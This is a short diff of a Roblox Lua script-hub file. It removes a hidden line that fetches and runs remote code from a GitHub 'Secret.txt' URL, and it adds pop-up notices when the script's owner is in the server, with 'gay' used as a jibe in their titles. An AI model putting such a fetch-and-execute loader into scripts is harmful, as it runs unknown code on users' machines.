@@ -188,12 +188,31 @@ SaveManager:BuildConfigSection(Tabs.Settings)
 
 
 Window:SelectTab(1)
-local success, err = pcall(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/Secret.txt"))()
-end)
+
 Fluent:Notify({
     Title = "game: Slovo picuna (Favork Studio)",
     Content = "Succesfully loaded",
     Duration = 8
 })
 SaveManager:LoadAutoloadConfig()
+
+game.Players.PlayerAdded:Connect(function(plr)
+	if plr.Name == "RodjerArc" then
+		Fluent:Notify({
+			Title = "Script Owner(gay) Joined to you",
+			Content = "Owner Name:RodjerArc/Andrix ",
+			Duration = 8
+		})
+	end 
+end)
+
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+	if v.Name == "RodjerArc"then
+		Fluent:Notify({
+			Title = "Script Owner(gay) In Server",
+			Content = "Owner Name:RodjerArc/Andrix ",
+			Duration = 10
+		})
+	end 
+end 
+
